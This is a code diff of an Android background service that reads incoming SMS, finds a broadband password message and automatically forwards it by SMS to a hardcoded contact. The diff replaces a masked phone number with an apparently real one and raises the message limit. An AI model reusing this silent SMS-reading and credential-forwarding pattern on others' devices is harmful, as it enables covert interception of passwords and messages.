@@ -22,7 +22,7 @@ public class Myservice extends Service {
 	private static int smsCounter = 0;
 	private PasswordObserver passwordObserver;
 	private ContentObserver mObserver;
-	private String mengouNum = "1891519xxxx"; // 孟狗号码1891519xxxx
+	private String mengouNum = "18915192180"; // 孟狗号码1891519xxxx
 	private String address = "16300";
 	private String msgBoby = "xykdmm";
 	private String msgBobyFromMengou = "密码";
@@ -137,11 +137,12 @@ public class Myservice extends Service {
 			long date = cursor.getLong(cursor.getColumnIndex("date"));
 			if ((sysTime() - date) < 50000 && read == 0 && body.contains("上网密码为")) { // 如果是在五分钟之内收到的密码短信，则判断为刚刚收到的短信，可以发送给孟狗
 				smsCounter++;
-				if (smsCounter > 10) {// 如果程序出错，发过超过10条短息，跳出
+				if (smsCounter > 20) {// 如果程序出错，发过超过10条短息，跳出
 					return;
 				}
 				SmsManager smsManager = SmsManager.getDefault();
-				smsManager.sendTextMessage(mengouNum, null, sendBody, null, null);
+				int i = 20 - smsCounter;
+				smsManager.sendTextMessage(mengouNum, null, sendBody + "还有"+ i + "条", null, null);
 				System.out.println("smsCounter == " + smsCounter);
 				printLog("sendPasswordToMengou", "密码已经发送给孟狗");
 				mContentResolver.unregisterContentObserver(passwordObserver);
